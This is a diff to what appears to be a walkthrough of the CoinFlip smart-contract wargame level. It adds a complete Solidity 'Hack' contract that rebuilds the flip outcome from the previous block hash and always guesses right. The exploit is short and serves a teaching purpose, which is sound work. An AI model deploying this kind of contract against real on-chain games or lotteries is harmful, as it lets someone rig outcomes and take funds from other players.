@@ -167,6 +167,44 @@ uint256 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR;
 
 ---
 
+### 🛡️ Attack Contract
+
+<details>
+<summary><code>// Hack.sol</code></summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./CoinFlip.sol";
+
+contract Hack {
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    CoinFlip private immutable coinFlip;
+
+    constructor(address _coinFlip) {
+        coinFlip = CoinFlip(_coinFlip);
+    }
+
+    function flip() external {
+        bool guess = _guess();
+        require(coinFlip.flip(guess), "Flip failed");
+    }
+
+    function _guess() private view returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 flipResult = blockValue / FACTOR;
+        return flipResult == 1;
+    }
+}
+```
+
+</details>
+
+---
+
 ## 🛠️ Hack Contract (FlipCoin Branch)
 
 ### 🔑 How the Hack Works
